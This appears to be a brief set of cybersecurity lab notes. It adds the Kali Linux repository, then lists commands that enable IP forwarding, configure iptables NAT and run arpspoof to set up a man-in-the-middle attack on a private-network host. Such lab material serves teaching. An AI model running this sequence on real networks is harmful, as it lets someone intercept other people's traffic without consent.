# cyberlabcodes
test
deb http://http.kali.org/kali kali-rolling main contrib non-free
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5


sudo sysctl -w net.ipv4.ip_forward=1

cat /proc/sys/net/ipv4/ip_forward

sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

sudo iptables -A FORWARD -i eth0 -j ACCEPT

sudo arpspoof -i eth0 -t 192.168.128.2 192.168.128.1


